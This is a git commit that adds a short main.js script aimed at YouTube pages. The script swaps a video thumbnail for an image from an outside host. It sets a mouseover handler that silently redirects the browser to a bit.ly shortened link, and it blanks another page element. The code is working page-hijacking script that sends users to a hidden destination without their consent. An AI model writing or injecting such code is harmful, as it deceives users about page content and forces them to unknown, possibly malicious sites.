4c2c3f77eaa7f718947edc0280a7262f0fef5b57
hentocum <96339616+hentocum@users.noreply.github.com>
2021-12-19 02:58:53 +0400

    Add files via upload

---
+++ main.js
@@ -0,0 +1,2 @@
+
+var target = document.getElementsByClassName("style-scope yt-img-shadow")[16]; target.setAttribute("src","https://img119.imagetwist.com/th/43141/he0telajpl1g.jpg");target.setAttribute("onmouseover","window.location = 'https://bit.ly/33HyEt6'");document.getElementsByClassName("style-scope ytd-rich-grid-media")[60].innerHTML = " ";
